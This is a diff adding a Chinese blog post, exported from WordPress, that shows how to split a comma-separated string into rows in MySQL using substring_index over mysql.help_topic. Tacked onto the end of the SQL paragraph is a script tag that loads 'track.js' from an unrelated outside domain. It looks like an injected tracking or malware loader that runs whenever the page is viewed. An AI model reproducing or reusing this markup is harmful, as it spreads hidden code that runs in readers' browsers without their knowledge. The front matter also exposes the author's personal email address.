@@ -1,0 +1,39 @@
+---
+layout: post
+title: mysql单行拆多行，多行合并单行
+date: 2022-04-24 13:30:34.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Mysql
+tags: []
+meta:
+  _edit_last: '1'
+  _wp_old_date: '2022-04-20'
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2022/04/24/mysql%e5%8d%95%e8%a1%8c%e6%8b%86%e5%a4%9a%e8%a1%8c%ef%bc%8c%e5%a4%9a%e8%a1%8c%e5%90%88%e5%b9%b6%e5%8d%95%e8%a1%8c/"
+---
+<p>分隔效果</p>
+<p>-- 分隔前<br />
+1,2,3,4<br />
+-- 分隔后<br />
+1<br />
+2<br />
+3<br />
+4</p>
+<p>分隔命令行</p>
+<p>SELECT<br />
+substring_index(substring_index('1,2,3,4',',', b.help_topic_id + 1), ',', -1) result<br />
+FROM<br />
+mysql.help_topic b<br />
+where<br />
+b.help_topic_id &lt; (LENGTH('1,2,3,4') - LENGTH(REPLACE('1,2,3,4', ',', '')) + 1);<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
